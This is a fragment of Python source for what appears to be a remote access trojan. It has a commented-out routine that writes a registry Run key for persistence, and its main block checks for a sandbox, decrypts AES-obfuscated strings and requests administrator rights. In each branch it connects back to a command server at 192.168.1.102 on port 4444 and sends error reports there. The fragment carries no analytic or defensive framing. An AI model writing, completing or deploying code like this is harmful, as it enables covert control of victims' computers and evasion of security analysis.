#         reg.SetValueEx(open_key, "MyPersistentScript", 0, reg.REG_SZ, file_path)
#         reg.CloseKey(open_key)
#         print("Successfully added to registry")
#     except Exception as e:
#         send(f"Error adding to registry: {e}")

if __name__ == '__main__':
    try:
        if is_sandbox():
            print(aes_decrypt_string(obf_strings["sandbox_detected"], AES_KEY, AES_IV))
            # self_destruct()

        # add_to_registry()

        if not is_admin():
            if request_admin_privileges():
                print("Running with administrative privileges.")
                server('192.168.1.102', 4444)  
                run()
            else:
                print("Running with user privileges.")
                server('192.168.1.102', 4444)  
                run()
        else:
            print("Running with administrative privileges.")
            server('192.168.1.102', 4444)  
            run()
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
